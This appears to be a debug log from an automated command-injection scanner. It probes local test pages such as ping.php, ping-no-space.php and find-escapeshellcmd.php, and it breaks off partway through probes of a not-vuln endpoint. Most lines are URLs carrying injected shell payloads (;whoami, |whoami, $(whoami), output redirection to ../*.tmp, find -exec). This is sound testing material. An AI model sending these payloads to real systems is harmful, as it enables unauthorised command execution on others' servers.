17:18:02,685 asyncio DEBUG Using selector: EpollSelector
17:18:02,687 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?input=find-escapeshellcmd.php
17:18:02,688 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=%3Bwhoami
17:18:02,688 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=%3Bwhoami%3E..%2Fe851fcf5-76a2-40a7-a456-31de867318e7.tmp
17:18:02,689 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=localhost%3Bwhoami
17:18:02,689 root INFO http://localhost:5002/arg-inj/find-escapeshellcmd.php?host=localhost%3Bwhoami%3E..%2Fccbaf300-7d0e-4ddb-bd49-ebd363b19c8d.tmp
17:18:02,690 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=%26whoami
17:18:02,690 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=%26whoami%3E..%2F12dcaacd-1f31-44a5-a3c8-50aac1351d8f.tmp
17:18:02,691 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=localhost%26whoami
17:18:02,692 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=localhost%26whoami%3E..%2F8775693e-207c-4663-92b5-8525bfbf1288.tmp
17:18:02,693 root INFO http://localhost:5002/arg-inj/find-escapeshellcmd.php?host=%26%26whoami
17:18:02,693 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=%26%26whoami%3E..%2F278ca077-2868-47c0-8a2d-f074b94c1aaa.tmp
17:18:02,694 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=localhost%26%26whoami
17:18:02,694 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=localhost%26%26whoami%3E..%2F41a9bebf-625f-4017-b5be-807e1edd8caf.tmp
17:18:02,695 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=%7Cwhoami
17:18:02,695 root INFO http://localhost:5002/arg-inj/find-escapeshellcmd.php?host=%7Cwhoami%3E..%2F44f8c61c-8b7f-407a-b7f5-3aa2a07ce123.tmp
17:18:02,696 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=localhost%7Cwhoami
17:18:02,696 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=localhost%7Cwhoami%3E..%2F39238838-eac1-4f12-a3fd-be8a171393fa.tmp
17:18:02,697 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=%7C%7Cwhoami
17:18:02,697 root INFO http://localhost:5002/arg-inj/find-escapeshellcmd.php?host=%7C%7Cwhoami%3E..%2F7cc04607-0566-4951-b196-1fbf59c60134.tmp
17:18:02,697 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=localhost%7C%7Cwhoami
17:18:02,698 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=localhost%7C%7Cwhoami%3E..%2F6ee9e2bb-2b31-48a4-b556-cc33992ae235.tmp
17:18:02,698 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=%24%28whoami%29
17:18:02,698 root INFO http://localhost:5001/arg-inj/find-escapeshellcmd.php?host=%24%28whoami%29%3E..%2Fedae1f32-daf3-4c13-b603-41b7fe596572.tmp
17:18:02,699 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=localhost%24%28whoami%29
17:18:02,699 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?host=localhost%24%28whoami%29%3E..%2Fd213e213-c0cc-491a-8a19-4e0b7997e072.tmp
17:18:02,699 root INFO http://localhost:5000/arg-inj/find-escapeshellcmd.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:18:02,755 root INFO http://localhost:5001/cmd-inj/ping.php?host=localhost
17:18:02,755 root INFO http://localhost:5002/cmd-inj/ping.php?host=%3Bwhoami
17:18:02,756 root INFO http://localhost:5001/cmd-inj/ping.php?host=%3Bwhoami%3E..%2Fb7730ee0-c972-4f6d-a717-c4d7e6e84ab6.tmp
17:18:02,756 root INFO http://localhost:5000/cmd-inj/ping.php?host=localhost%3Bwhoami
17:18:02,756 root INFO http://localhost:5000/cmd-inj/ping.php?host=localhost%3Bwhoami%3E..%2Fa6378643-a969-4825-927a-05112e6ba979.tmp
17:18:02,757 root INFO http://localhost:5002/cmd-inj/ping.php?host=%26whoami
17:18:02,758 root INFO http://localhost:5000/cmd-inj/ping.php?host=%26whoami%3E..%2Fa1c7d70f-84be-465d-a0cc-6f95a87a6718.tmp
17:18:02,758 root INFO http://localhost:5002/cmd-inj/ping.php?host=localhost%26whoami
17:18:02,759 root INFO http://localhost:5001/cmd-inj/ping.php?host=localhost%26whoami%3E..%2Fda1acd21-6e49-46e4-9fcf-c928fef24b57.tmp
17:18:02,759 root INFO http://localhost:5002/cmd-inj/ping.php?host=%26%26whoami
17:18:02,759 root INFO http://localhost:5002/cmd-inj/ping.php?host=%26%26whoami%3E..%2F6032b91c-0dd5-481c-b391-276b9e16f59e.tmp
17:18:02,760 root INFO http://localhost:5000/cmd-inj/ping.php?host=localhost%26%26whoami
17:18:02,760 root INFO http://localhost:5000/cmd-inj/ping.php?host=localhost%26%26whoami%3E..%2Ffd0b76e4-a26e-442b-b68e-984c3fa1fd9e.tmp
17:18:02,761 root INFO http://localhost:5000/cmd-inj/ping.php?host=%7Cwhoami
17:18:02,761 root INFO http://localhost:5000/cmd-inj/ping.php?host=%7Cwhoami%3E..%2Fe08503ff-3464-4b8e-8b49-3c3f8ac88bd9.tmp
17:18:02,762 root INFO http://localhost:5000/cmd-inj/ping.php?host=localhost%7Cwhoami
17:18:02,762 root INFO http://localhost:5001/cmd-inj/ping.php?host=localhost%7Cwhoami%3E..%2Fbbba6d9b-8b66-4e3c-8778-c3993395615e.tmp
17:18:02,763 root INFO http://localhost:5000/cmd-inj/ping.php?host=%7C%7Cwhoami
17:18:02,764 root INFO http://localhost:5000/cmd-inj/ping.php?host=%7C%7Cwhoami%3E..%2F423ce2c6-9cac-47ca-bc89-76bf02131df9.tmp
17:18:02,764 root INFO http://localhost:5000/cmd-inj/ping.php?host=localhost%7C%7Cwhoami
17:18:02,765 root INFO http://localhost:5001/cmd-inj/ping.php?host=localhost%7C%7Cwhoami%3E..%2F817f38a5-b02c-43b3-ac2c-3a77dd9eb549.tmp
17:18:02,766 root INFO http://localhost:5001/cmd-inj/ping.php?host=%24%28whoami%29
17:18:02,767 root INFO http://localhost:5000/cmd-inj/ping.php?host=%24%28whoami%29%3E..%2F09910d37-11cb-4e98-bddc-77dceae58881.tmp
17:18:02,768 root INFO http://localhost:5002/cmd-inj/ping.php?host=localhost%24%28whoami%29
17:18:02,768 root INFO http://localhost:5002/cmd-inj/ping.php?host=localhost%24%28whoami%29%3E..%2F9fa8457f-b25d-41d8-8af5-c7ead918dda1.tmp
17:18:02,769 root INFO http://localhost:5001/cmd-inj/ping.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:18:11,35 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:11,35 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:11,36 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:11,37 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:11,37 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:11,38 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:11,39 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:13,60 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:13,70 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:15,118 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:15,119 root INFO http://localhost:5001/cmd-inj/ping-no-amp.php?host=localhost
17:18:15,120 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=%3Bwhoami
17:18:15,121 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=%3Bwhoami%3E..%2F45faf34d-283a-4960-b5e2-6d41e1a199d9.tmp
17:18:15,121 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=localhost%3Bwhoami
17:18:15,122 root INFO http://localhost:5001/cmd-inj/ping-no-amp.php?host=localhost%3Bwhoami%3E..%2F30ba9fdb-7a6f-4400-b87c-cb752a0bd8fe.tmp
17:18:15,123 root INFO http://localhost:5002/cmd-inj/ping-no-amp.php?host=%26whoami
17:18:15,124 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=%26whoami%3E..%2F6a74685d-7178-48fe-80b0-ad0b95901ca1.tmp
17:18:15,125 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=localhost%26whoami
17:18:15,126 root INFO http://localhost:5002/cmd-inj/ping-no-amp.php?host=localhost%26whoami%3E..%2F524fad2a-7e8a-4b13-827b-0170d1fd66e4.tmp
17:18:15,126 root INFO http://localhost:5002/cmd-inj/ping-no-amp.php?host=%26%26whoami
17:18:15,127 root INFO http://localhost:5001/cmd-inj/ping-no-amp.php?host=%26%26whoami%3E..%2F7adbce10-dc32-4b09-a90d-7da80e04b2ff.tmp
17:18:15,129 root INFO http://localhost:5002/cmd-inj/ping-no-amp.php?host=localhost%26%26whoami
17:18:15,130 root INFO http://localhost:5001/cmd-inj/ping-no-amp.php?host=localhost%26%26whoami%3E..%2F98cc7cb7-b59c-4c92-9b2d-bb5fefcc1e1c.tmp
17:18:15,131 root INFO http://localhost:5002/cmd-inj/ping-no-amp.php?host=%7Cwhoami
17:18:15,131 root INFO http://localhost:5002/cmd-inj/ping-no-amp.php?host=%7Cwhoami%3E..%2F2f217d7f-698f-4eaa-b769-b810de369a6e.tmp
17:18:15,132 root INFO http://localhost:5001/cmd-inj/ping-no-amp.php?host=localhost%7Cwhoami
17:18:15,133 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=localhost%7Cwhoami%3E..%2Fa37f39e3-7b7b-4bce-a611-aa87d2fed9cc.tmp
17:18:15,134 root INFO http://localhost:5001/cmd-inj/ping-no-amp.php?host=%7C%7Cwhoami
17:18:15,135 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=%7C%7Cwhoami%3E..%2F48f74650-bea3-41b0-8f58-d87d6d3c9d15.tmp
17:18:15,136 root INFO http://localhost:5001/cmd-inj/ping-no-amp.php?host=localhost%7C%7Cwhoami
17:18:15,137 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=localhost%7C%7Cwhoami%3E..%2Fb2d35d7d-7a6d-4826-8cec-f22b2d719067.tmp
17:18:15,138 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=%24%28whoami%29
17:18:15,139 root INFO http://localhost:5002/cmd-inj/ping-no-amp.php?host=%24%28whoami%29%3E..%2F27c0a4b7-a645-4b07-82af-d20c8095a4d2.tmp
17:18:15,140 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=localhost%24%28whoami%29
17:18:15,141 root INFO http://localhost:5000/cmd-inj/ping-no-amp.php?host=localhost%24%28whoami%29%3E..%2F70b77aaa-4e9e-4926-be20-03776fb8a56f.tmp
17:18:15,142 root INFO http://localhost:5002/cmd-inj/ping-no-amp.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:18:15,311 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:15,312 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:15,313 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:17,218 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:19,265 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:19,293 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:19,304 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:23,362 root INFO http://localhost:5002/cmd-inj/ping-no-space.php?host=localhost
17:18:23,363 root INFO http://localhost:5002/cmd-inj/ping-no-space.php?host=%3Bwhoami
17:18:23,364 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=%3Bwhoami%3E..%2F62566ace-a6e8-4c22-92b2-9a44981cd45a.tmp
17:18:23,365 root INFO http://localhost:5001/cmd-inj/ping-no-space.php?host=localhost%3Bwhoami
17:18:23,366 root INFO http://localhost:5002/cmd-inj/ping-no-space.php?host=localhost%3Bwhoami%3E..%2Fb8e1af06-7601-4b77-b376-2998b190f458.tmp
17:18:23,367 root INFO http://localhost:5002/cmd-inj/ping-no-space.php?host=%26whoami
17:18:23,368 root INFO http://localhost:5002/cmd-inj/ping-no-space.php?host=%26whoami%3E..%2F0b19f589-2832-4ada-a262-b446440f2598.tmp
17:18:23,368 root INFO http://localhost:5001/cmd-inj/ping-no-space.php?host=localhost%26whoami
17:18:23,369 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=localhost%26whoami%3E..%2Fbfcb9420-aebd-46c4-8b6d-2db14e9ef954.tmp
17:18:23,369 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=%26%26whoami
17:18:23,369 root INFO http://localhost:5001/cmd-inj/ping-no-space.php?host=%26%26whoami%3E..%2F7e28f496-4996-4d2d-bba7-17860cc44b4a.tmp
17:18:23,370 root INFO http://localhost:5001/cmd-inj/ping-no-space.php?host=localhost%26%26whoami
17:18:23,370 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=localhost%26%26whoami%3E..%2F34c14846-e0f5-4082-b357-35dccff21d14.tmp
17:18:23,371 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=%7Cwhoami
17:18:23,371 root INFO http://localhost:5002/cmd-inj/ping-no-space.php?host=%7Cwhoami%3E..%2F2cb91aba-e732-4cd8-8e78-eba5a07d8792.tmp
17:18:23,371 root INFO http://localhost:5001/cmd-inj/ping-no-space.php?host=localhost%7Cwhoami
17:18:23,372 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=localhost%7Cwhoami%3E..%2F981bd0af-fd17-424c-89f4-f059cbed9636.tmp
17:18:23,372 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=%7C%7Cwhoami
17:18:23,372 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=%7C%7Cwhoami%3E..%2F3b8bc055-1225-455f-a356-26f31234def5.tmp
17:18:23,372 root INFO http://localhost:5001/cmd-inj/ping-no-space.php?host=localhost%7C%7Cwhoami
17:18:23,373 root INFO http://localhost:5001/cmd-inj/ping-no-space.php?host=localhost%7C%7Cwhoami%3E..%2F140a8a65-c649-4708-ad3e-a8a34a987bd1.tmp
17:18:23,374 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=%24%28whoami%29
17:18:23,374 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=%24%28whoami%29%3E..%2F1623b0f4-15d0-4aeb-b867-6b31f9f8a522.tmp
17:18:23,375 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=localhost%24%28whoami%29
17:18:23,376 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?host=localhost%24%28whoami%29%3E..%2F5b68ed14-4e00-44ec-a415-64fcd4584e45.tmp
17:18:23,376 root INFO http://localhost:5000/cmd-inj/ping-no-space.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:18:29,591 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:29,592 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:29,594 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:29,596 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:29,597 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:29,598 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:29,600 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:29,601 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:29,602 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:29,603 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:35,675 root INFO http://localhost:5002/cmd-inj/ping-no-semicol.php?host=localhost
17:18:35,676 root INFO http://localhost:5002/cmd-inj/ping-no-semicol.php?host=%3Bwhoami
17:18:35,677 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=%3Bwhoami%3E..%2F78187fa9-eeb2-4529-b19c-c44db0188f77.tmp
17:18:35,677 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=localhost%3Bwhoami
17:18:35,678 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=localhost%3Bwhoami%3E..%2Ff9d7b6b9-f2bc-48e3-84eb-300a05c26ab6.tmp
17:18:35,679 root INFO http://localhost:5002/cmd-inj/ping-no-semicol.php?host=%26whoami
17:18:35,680 root INFO http://localhost:5001/cmd-inj/ping-no-semicol.php?host=%26whoami%3E..%2F5b0c79f2-2656-42d0-8461-944340b43487.tmp
17:18:35,681 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=localhost%26whoami
17:18:35,682 root INFO http://localhost:5001/cmd-inj/ping-no-semicol.php?host=localhost%26whoami%3E..%2F283578e6-d74b-4eb8-8040-2d64ba6fbf24.tmp
17:18:35,683 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=%26%26whoami
17:18:35,684 root INFO http://localhost:5002/cmd-inj/ping-no-semicol.php?host=%26%26whoami%3E..%2F84a7097a-73d2-4682-ae5e-682749b3b4e5.tmp
17:18:35,686 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=localhost%26%26whoami
17:18:35,687 root INFO http://localhost:5001/cmd-inj/ping-no-semicol.php?host=localhost%26%26whoami%3E..%2F6ed9e4ee-bc7d-42e2-8b06-261b79d594b9.tmp
17:18:35,687 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=%7Cwhoami
17:18:35,689 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=%7Cwhoami%3E..%2F49b65fed-eac0-4129-a3ce-4a321c2c505d.tmp
17:18:35,690 root INFO http://localhost:5001/cmd-inj/ping-no-semicol.php?host=localhost%7Cwhoami
17:18:35,691 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=localhost%7Cwhoami%3E..%2Fbf9ba6e1-d6f2-4cff-a37e-25833bd5e72f.tmp
17:18:35,692 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=%7C%7Cwhoami
17:18:35,693 root INFO http://localhost:5000/cmd-inj/ping-no-semicol.php?host=%7C%7Cwhoami%3E..%2Fca28c0f0-7d01-4d5d-877e-ea45f5cdee63.tmp
17:18:35,695 root INFO http://localhost:5001/cmd-inj/ping-no-semicol.php?host=localhost%7C%7Cwhoami
17:18:35,696 root INFO http://localhost:5001/cmd-inj/ping-no-semicol.php?host=localhost%7C%7Cwhoami%3E..%2Fde79c732-6203-4e13-83ca-7a29dc68626a.tmp
17:18:35,697 root INFO http://localhost:5002/cmd-inj/ping-no-semicol.php?host=%24%28whoami%29
17:18:35,698 root INFO http://localhost:5002/cmd-inj/ping-no-semicol.php?host=%24%28whoami%29%3E..%2F08407a4d-ef84-40ee-949a-d2fbf1ec6bff.tmp
17:18:35,698 root INFO http://localhost:5001/cmd-inj/ping-no-semicol.php?host=localhost%24%28whoami%29
17:18:35,699 root INFO http://localhost:5002/cmd-inj/ping-no-semicol.php?host=localhost%24%28whoami%29%3E..%2Ffac6c7db-4d6e-498f-bca8-4ae56efe830c.tmp
17:18:35,700 root INFO http://localhost:5002/cmd-inj/ping-no-semicol.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:18:37,798 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:37,799 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:37,799 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:39,808 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:39,828 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:39,835 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:41,896 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:45,983 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:45,989 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=localhost
17:18:45,990 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=%3Bwhoami
17:18:45,990 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=%3Bwhoami%3E..%2Fa9d39a2d-8ce2-4f18-a856-214374eefbb2.tmp
17:18:45,991 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=localhost%3Bwhoami
17:18:45,991 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=localhost%3Bwhoami%3E..%2F37b63410-4769-44cf-b025-dc4de1d50ee1.tmp
17:18:45,992 root INFO http://localhost:5002/cmd-inj/ping-no-pipe.php?host=%26whoami
17:18:45,993 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=%26whoami%3E..%2F28ac06fb-e438-47fe-abf3-f51ee24f15a7.tmp
17:18:45,994 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=localhost%26whoami
17:18:45,995 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=localhost%26whoami%3E..%2F44ff5b51-c11f-43ee-9502-fea50ac403c3.tmp
17:18:45,995 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=%26%26whoami
17:18:45,996 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=%26%26whoami%3E..%2F52c85661-9420-4357-850f-7d2310fed512.tmp
17:18:45,997 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=localhost%26%26whoami
17:18:45,998 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=localhost%26%26whoami%3E..%2F46070269-0256-4d51-b92d-e77ec3c37722.tmp
17:18:45,998 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=%7Cwhoami
17:18:45,999 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=%7Cwhoami%3E..%2F68b33495-d7a0-4360-a90b-538cf7aa6b83.tmp
17:18:45,999 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=localhost%7Cwhoami
17:18:45,999 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=localhost%7Cwhoami%3E..%2F9de1cfb8-d1d8-4e05-bc61-686229f01a33.tmp
17:18:46,0 root INFO http://localhost:5002/cmd-inj/ping-no-pipe.php?host=%7C%7Cwhoami
17:18:46,0 root INFO http://localhost:5002/cmd-inj/ping-no-pipe.php?host=%7C%7Cwhoami%3E..%2F692efa92-c80a-46f2-873a-2f38a15293a3.tmp
17:18:46,0 root INFO http://localhost:5002/cmd-inj/ping-no-pipe.php?host=localhost%7C%7Cwhoami
17:18:46,1 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=localhost%7C%7Cwhoami%3E..%2F80aeb1d3-c979-4213-ba3c-df8242afbcd6.tmp
17:18:46,2 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=%24%28whoami%29
17:18:46,3 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=%24%28whoami%29%3E..%2F8c9ed0ee-8c10-4326-9688-fde62e283d1b.tmp
17:18:46,4 root INFO http://localhost:5000/cmd-inj/ping-no-pipe.php?host=localhost%24%28whoami%29
17:18:46,4 root INFO http://localhost:5001/cmd-inj/ping-no-pipe.php?host=localhost%24%28whoami%29%3E..%2Ff9c71ad4-1c86-4519-b8b8-2d293df8bf1e.tmp
17:18:46,4 root INFO http://localhost:5002/cmd-inj/ping-no-pipe.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:18:48,61 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:50,113 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:52,161 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:52,165 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:52,167 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:54,207 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:54,214 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:54,215 root INFO http://localhost:5002/blind-cmd-inj/ping-no-output.php?host=%3Bwhoami
17:18:54,215 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?host=%3Bwhoami%3E..%2F455bd3cb-1033-4891-ae38-37abde8d1025.tmp
17:18:54,216 root INFO http://localhost:5001/blind-cmd-inj/ping-no-output.php?host=localhost%3Bwhoami
17:18:54,216 root INFO http://localhost:5001/blind-cmd-inj/ping-no-output.php?host=localhost%3Bwhoami%3E..%2Fb8e76322-b073-42a9-b06c-7eb92ddee790.tmp
17:18:54,217 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?host=%26whoami
17:18:54,217 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?host=%26whoami%3E..%2Fb67c1367-b374-4fb0-b4b6-1d75466cbc56.tmp
17:18:54,218 root INFO http://localhost:5001/blind-cmd-inj/ping-no-output.php?host=localhost%26whoami
17:18:54,219 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?host=localhost%26whoami%3E..%2F5ca9bb00-bab2-4e47-9e2a-2480856631a8.tmp
17:18:54,219 root INFO http://localhost:5001/blind-cmd-inj/ping-no-output.php?host=%26%26whoami
17:18:54,220 root INFO http://localhost:5002/blind-cmd-inj/ping-no-output.php?host=%26%26whoami%3E..%2Fc3d3a3ca-04f8-4075-95af-cf2e68ed5e52.tmp
17:18:54,220 root INFO http://localhost:5001/blind-cmd-inj/ping-no-output.php?host=localhost%26%26whoami
17:18:54,221 root INFO http://localhost:5001/blind-cmd-inj/ping-no-output.php?host=localhost%26%26whoami%3E..%2Fd1bce0c3-9c9d-497d-b0ac-c6da67631adf.tmp
17:18:54,222 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?host=%7Cwhoami
17:18:54,222 root INFO http://localhost:5002/blind-cmd-inj/ping-no-output.php?host=%7Cwhoami%3E..%2F43b460ed-961e-4f2a-903b-b488d75939b3.tmp
17:18:54,222 root INFO http://localhost:5001/blind-cmd-inj/ping-no-output.php?host=localhost%7Cwhoami
17:18:54,223 root INFO http://localhost:5001/blind-cmd-inj/ping-no-output.php?host=localhost%7Cwhoami%3E..%2Ffd6fc7bb-319c-4524-ad85-85d17c9322ca.tmp
17:18:54,223 root INFO http://localhost:5002/blind-cmd-inj/ping-no-output.php?host=%7C%7Cwhoami
17:18:54,223 root INFO http://localhost:5002/blind-cmd-inj/ping-no-output.php?host=%7C%7Cwhoami%3E..%2F5c711a51-4d9b-4df0-a847-464b0708289a.tmp
17:18:54,224 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?host=localhost%7C%7Cwhoami
17:18:54,224 root INFO http://localhost:5002/blind-cmd-inj/ping-no-output.php?host=localhost%7C%7Cwhoami%3E..%2F9009d820-aed2-40bf-b614-c4520b4bc514.tmp
17:18:54,224 root INFO http://localhost:5002/blind-cmd-inj/ping-no-output.php?host=%24%28whoami%29
17:18:54,225 root INFO http://localhost:5002/blind-cmd-inj/ping-no-output.php?host=%24%28whoami%29%3E..%2Fc6b0e7bb-4625-42a7-8f48-f481d7e37a15.tmp
17:18:54,225 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?host=localhost%24%28whoami%29
17:18:54,225 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?host=localhost%24%28whoami%29%3E..%2Ff36bce6a-6b65-43a0-a6bb-1766915c87bf.tmp
17:18:54,226 root INFO http://localhost:5000/blind-cmd-inj/ping-no-output.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:18:58,366 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:58,367 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:58,369 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:58,369 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:58,370 charset_normalizer DEBUG Encoding detection on empty bytes, assuming utf_8 intention.
17:18:58,372 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:58,373 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:18:58,376 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:19:02,428 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:19:04,477 charset_normalizer DEBUG Encoding detection: ascii is most likely the one.
17:19:08,571 root INFO http://localhost:5000/not-vuln/echo.php?host=%3Bwhoami
17:19:08,572 root INFO http://localhost:5001/not-vuln/echo.php?host=%3Bwhoami%3E..%2Fc91787e4-a667-4a12-a6f0-1dc1bc4e2651.tmp
17:19:08,573 root INFO http://localhost:5002/not-vuln/echo.php?host=localhost%3Bwhoami
17:19:08,574 root INFO http://localhost:5001/not-vuln/echo.php?host=localhost%3Bwhoami%3E..%2Fd440f5ab-f2e5-4344-ace0-40e6085752db.tmp
17:19:08,575 root INFO http://localhost:5000/not-vuln/echo.php?host=%26whoami
17:19:08,576 root INFO http://localhost:5000/not-vuln/echo.php?host=%26whoami%3E..%2F59eb4809-7971-464b-8e7c-2a0b26223705.tmp
17:19:08,577 root INFO http://localhost:5002/not-vuln/echo.php?host=localhost%26whoami
17:19:08,577 root INFO http://localhost:5000/not-vuln/echo.php?host=localhost%26whoami%3E..%2F1aa5627a-b226-4388-a40c-e944f0e1eac5.tmp
17:19:08,578 root INFO http://localhost:5000/not-vuln/echo.php?host=%26%26whoami
